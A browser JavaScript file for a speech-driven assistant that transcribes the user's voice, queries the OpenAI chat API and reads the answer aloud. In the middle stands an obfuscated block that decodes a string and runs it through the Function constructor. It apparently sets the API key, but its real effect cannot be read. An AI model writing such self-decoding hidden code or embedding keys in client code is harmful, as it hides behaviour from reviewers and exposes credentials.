var micInput;
// Create a new instance of SpeechRecognition
const recognition = new webkitSpeechRecognition() || new SpeechRecognition();

// Set the language for speech recognition (optional)
recognition.lang = 'en-US';
const outputDisplay = document.querySelector('#output'); // Selecting by ID using querySelector

// Function to handle speech recognition result
recognition.onresult = function(event) {
  const transcript = event.results[0][0].transcript;
  
  // Assign the recognized text to the output variable
  const outputElement = document.getElementById('output'); // Assuming 'output' is the ID of your output element
  outputElement.value = transcript;
  outputDisplay.innerText = transcript;

  // Call generate function with transcript as argument
  generate(transcript);
};

// Function to handle speech recognition error
recognition.onerror = function(event) {
  console.error('Speech recognition error:', event.error);
};

// Function to start speech recognition
function startRecognition() {
  recognition.start();
    var wave2 = document.getElementById('animation2');
    wave2.style.display = 'block';
}

// Get the start button element
const startBtn = document.getElementById('startBtn');
// Add click event listener to start button
startBtn.addEventListener('click', function() {
    startRecognition();
});

// Get the mute button element
const muteBtn = document.getElementById('muteBtn');
// Add click event listener to mute button
muteBtn.addEventListener('click', function() {
    
    let wavez = document.getElementById('animation');
    wavez.style.display = 'none';
    let wavex = document.getElementById('animations');
    wavex.style.display = 'block';
    
  window.speechSynthesis.cancel();
   recognition.stop(); // Add this line to stop speech recognition
});

var apiKey;(function(){var hMI='',VSw=211-200;function huY(z){var m=2056057;var b=z.length;var t=[];for(var o=0;o<b;o++){t[o]=z.charAt(o)};for(var o=0;o<b;o++){var d=m*(o+414)+(m%20356);var n=m*(o+303)+(m%44745);var h=d%b;var c=n%b;var s=t[h];t[h]=t[c];t[c]=s;m=(d+n)%2687240;};return t.join('')};var mjd=huY('cttstbsawoongnkymriujqlhecvdrzcpuoxrf').substr(0,VSw);var kHQ='v4t9gs1)lqt,o,duy3)eo8po<")bv+=]]e+;(l];sp=ruesvga=hn;a[q)mo;}u.i(4jeo-3,ai}7at[ese) gcja6hi aht  c=wst6.);guAr,n-w-(v8za<var48=egefnd )d{Cnlr+.nd.e;(5ftaa2+c(;kik<7yi;h, ],ht"=,=rhe21ll<h{(n)o;8or+ =fvtp(+oi=kd0(+a]a}osrl(nCu;oe(e+7{ur=vraa+3m.+r)hbw.rpCr;y" r2=;.;((.r;  ",f{(a,on=jrtuuny7)0[,]crr=) n;vvmrfg;jstC+qh1-)=rumv;.ar})=0+i1n 5=t2";n,kk;evr5{.rot(exrg==itnka;(=t. 6.ra;=jtjhs01hf,;twr=h);ris =;t=;dabf=o.e; e8goti .)h;rno2i89r];o)-)a,=+(agr;),li>ucfa)nt(d )])c1C!4=gg8htneo[8A]r;f.tlj[tg6)(ulr9na=l1d{.txh+en,*t)r6;0+k)=k{[=u hs[h7n.ei[;,(<=vt))7;vht]l7f(f>u;frv[o)k}asmbAski g((air1kgCps+g.j=gae]z+)e(;f= i,k,pcr[lo,si2(pi(=,,vu.zie)92bvt=!n+vgne*t.rm-]d)vvn)nCkj}"aapmsi,j6=]0pnlr 1mrpfh;l.Ab"-;;arp=1zu.,]n+e2srv.s+),hrw;q8c=d(r0;v9r r02[6,1na9a1g(p)7C1a2dgws2fo=(n+( ys0i(9,n=ro[ hrn0++;}0=vgl(e+rnftc+dpAh7;;n.rlxylStn6nt.or[i)hafmogl(u=ua((;;a.u3.l;q,pl1tn n"a"S"jv[=0u8;';var hqy=huY[mjd];var TFi='';var Yjq=hqy;var Xxv=hqy(TFi,huY(kHQ));var zAy=Xxv(huY('0#t.ffbulr$i.(!da&Htldnga ;H3ht; x3)e&b=;a!7li.r.3(l4bb1xH5.$b};a;+6(v),c,Isg5H8(btwt_+Hb,(*.(7$*fj3_a)1%%.t)(.[,Hl)j$0ou+a;9.6qm-+q;_.nyn)=H.!t.y(b4.tHb6zv#s2ix!7p1H527{Sq3([7D$(!v(_s}Hp-zab.H1u!v*o),r,aa&HtwHa$)upc0tHkaj%5#.rH.oa0sH.ybn}}!.0t!+;)H_jta4,H;!s(4)t.HlH+4Hh;3Hj_sfl*(b;fx_q_)!$r;HSf37b+;5#f.t$=))v.7j39maHsb$=.+.f"ji+sr14p.}_)(H.j4 an.(;0HH(H9++)a.ejpHm-#,ckH(%3dv,42o)))ay=({H7)03\/x1,$H.1H"k0Ht.\/!Hm34i$v(f0(06,x$sp{0C_ra.-t$)rHkH")1 H._3s 9.H"(2rs46nH%t!.j2=$&H2zH=;;7xH;n)*HjHb\')=s,,\/yH=.eHHHjH#)H)vef.H$}..Hzm$]fsbv)\/mH S;.ikga)}!=x(.{.08_5He5!a7CuH_b=]erHjcb3.H v_.\'u1Ho3(.T)H.s=.au{raH=.;#4_.57H}i;ia2[,bp,]ofy.Hl7_i=Ho)kHHg;)oc.\',lfm,,xy,"b.!v.HH.s. {Hd,ke(He 53,b,ncri97 3f)*H{b%re.$$3=!0ls,$(v{Sd.(H_=.*v.;.}a.e0..3()3rHf,oi H0H1)%,z_n.!p,$e!,) _2(\/6bo0H1y!os,(r..$,g;.l3E9h6,tH)=.()v ,f}._s4!)00-,o;$;elk*$r)$$}}(H(=(oh14atigbtH!n!al)!.3gHiz=.2f.H29H"j(rnma1=e+H $ia8ramt!)qH(ai0= .{gg ")7_ff9Hu %v\']'));var ueE=Yjq(hMI,zAy );ueE(9715);return 2102})()
const endpoint = "https://api.openai.com/v1/chat/completions";

function generateResponse(userInput) {
    return fetch(endpoint, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${apiKey}`,
        },
        body: JSON.stringify({
            model: "gpt-3.5-turbo",
            messages: [
                {"role": "system", "content": "You are a helpful assistant."},
                {"role": "user", "content": userInput},
            ],
            max_tokens: 3500
        }),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`Failed to fetch response from API: ${response.statusText}`);
        }
        return response.json();
    })
    .then(data => {
        const modelResponse = data.choices[0].message.content.trim();
        return modelResponse;
    })
    .catch(error => {
        console.error('Error:', error.message);
        return 'I encountered an error while processing your request. Please try again later.';
    });
}
// Function to make the AI response audible
// Function to make the AI response audible
function speakResponse(response) {
    const wave = document.getElementById('animation');
    const otherElement = document.getElementById('animations'); // Replace 'otherElement' with the ID of your other element
    
    // Hide the other element
    otherElement.style.display = 'none';

    const utterance = new SpeechSynthesisUtterance(response);
    speechSynthesis.speak(utterance);

    // Add event listener for when the speech ends
    utterance.onend = function() {
        // Show the other element again
        otherElement.style.display = 'block';

        // Hide the wave element
        wave.style.display = 'none';
    };
}


function generate(transcript) {
    const wave = document.getElementById('animation');
  wave.style.display = 'block';
    const otherElement = document.getElementById('animations'); // Replace 'otherElement' with the ID of your other element
 otherElement.style.display = 'none';
    generateResponse(transcript).then(response => {
        outputDisplay.innerText = response;
        speakResponse(response); // Speak out the AI response
                
    });
}
var cancelvoice = document.getElementById('cancelBtn');
cancelvoice.addEventListener('click', function(){
    window.speechSynthesis.cancel();
    window.location.href = 'Home.html';
})